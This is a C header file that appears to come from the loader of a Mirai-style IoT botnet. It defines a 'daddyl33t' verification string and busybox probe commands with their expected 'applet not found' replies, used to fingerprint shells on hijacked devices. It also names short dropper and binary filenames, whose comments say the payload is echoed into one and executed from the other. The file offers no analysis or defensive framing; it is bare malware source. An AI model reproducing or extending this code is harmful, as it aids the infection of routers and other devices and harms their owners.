#pragma once

#include <stdint.h>

#define STDIN   0
#define STDOUT  1
#define STDERR  2

#define FALSE   0
#define TRUE    1
typedef char BOOL;

typedef uint32_t ipv4_t;
typedef uint16_t port_t;

#define LOADER_LITTLE_ENDIAN

#define ATOMIC_ADD(ptr,i) __sync_fetch_and_add((ptr),i)
#define ATOMIC_SUB(ptr,i) __sync_fetch_and_sub((ptr),i)
#define ATOMIC_INC(ptr) ATOMIC_ADD((ptr),1)
#define ATOMIC_DEC(ptr) ATOMIC_SUB((ptr),1)
#define ATOMIC_GET(ptr) ATOMIC_ADD((ptr),0)

#define VERIFY_STRING_HEX   "\\x64\\x61\\x64\\x64\\x79\\x6C\\x33\\x33\\x74"
#define VERIFY_STRING_CHECK "daddyl33t"

#define TOKEN_QUERY     "/bin/busybox yami"
#define TOKEN_RESPONSE  "yami: applet not found"

#define EXEC_QUERY     "/bin/busybox josho"
#define EXEC_RESPONSE  "josho: applet not found"
// try to keep these below 5 chars or wont run on some devices
#define FN_DROPPER  "wAd3"// filename binary gets echo'd to
#define FN_BINARY   "5aA3"// filename that gets executed

extern char *id_tag;
